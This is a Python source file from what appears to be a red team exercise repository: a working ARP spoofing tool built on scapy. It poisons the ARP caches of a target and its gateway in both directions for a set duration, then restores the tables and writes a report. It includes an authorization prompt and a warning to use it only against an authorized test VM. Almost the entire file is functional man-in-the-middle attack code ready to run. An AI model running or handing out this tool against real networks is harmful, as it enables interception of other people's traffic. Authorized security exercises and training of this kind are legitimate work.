# Red Team contribution represented in this group repository: Andy Vega Araya.
# Executable logic preserved from the supplied Red Team module.
import time

from scapy.all import ARP, Ether, send, srp

from modules.authorization import confirm_authorized_target
from modules.reporting import save_report

# Azure VNets commonly filter unsolicited/gratuitous ARP between VMs, so this
# attack may not work here regardless of the code. Run the pre-flight check
# in README.md before relying on this for the report.
DEFAULT_DURATION_SECONDS = 60
ARP_INTERVAL_SECONDS = 2


def get_mac(ip, timeout=3):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered, _ = srp(broadcast / arp_request, timeout=timeout, verbose=0)
    for _, received in answered:
        return received.hwsrc
    return None


def spoof(target_ip, target_mac, impersonate_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=impersonate_ip)
    send(packet, verbose=0)


def restore(target_ip, target_mac, impersonate_ip, impersonate_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=impersonate_ip, hwsrc=impersonate_mac)
    send(packet, count=4, verbose=0)


def main():
    print("Red Team ARP Spoofing Tool")
    print("Use only against the Blue Team VM you are authorized to test.\n")

    target_ip = input("Target IP: ").strip()
    confirm_authorized_target(target_ip)

    gateway_ip = input("Gateway IP to impersonate: ").strip()
    duration = input(f"Duration in seconds [{DEFAULT_DURATION_SECONDS}]: ").strip()
    duration = int(duration) if duration else DEFAULT_DURATION_SECONDS

    print("[arp] Resolving MAC addresses...")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        print("[arp] Could not resolve MAC addresses. Aborting - this alone may mean the VNet filters ARP.")
        save_report(
            tool_name="packet_attack",
            target=target_ip,
            data={
                "gateway_ip": gateway_ip,
                "result": "aborted_mac_resolution_failed",
                "target_mac_resolved": bool(target_mac),
                "gateway_mac_resolved": bool(gateway_mac),
            },
        )
        return

    print(f"[arp] target MAC: {target_mac}")
    print(f"[arp] gateway MAC: {gateway_mac}")
    print(f"[arp] spoofing for {duration}s, Ctrl+C to stop early\n")

    packets_sent = 0
    start = time.time()
    try:
        while time.time() - start < duration:
            spoof(target_ip, target_mac, gateway_ip)
            spoof(gateway_ip, gateway_mac, target_ip)
            packets_sent += 2
            print(f"[arp] packets sent: {packets_sent}", end="\r")
            time.sleep(ARP_INTERVAL_SECONDS)
    except KeyboardInterrupt:
        print("\n[arp] stopped early")
    finally:
        print("\n[arp] restoring ARP tables")
        restore(target_ip, target_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, target_ip, target_mac)

    report_path = save_report(
        tool_name="packet_attack",
        target=target_ip,
        data={
            "gateway_ip": gateway_ip,
            "duration_seconds": duration,
            "spoof_packets_sent": packets_sent,
            "arp_tables_restored": True,
        },
    )
    print(f"[arp] report saved to: {report_path}")


if __name__ == "__main__":
    main()
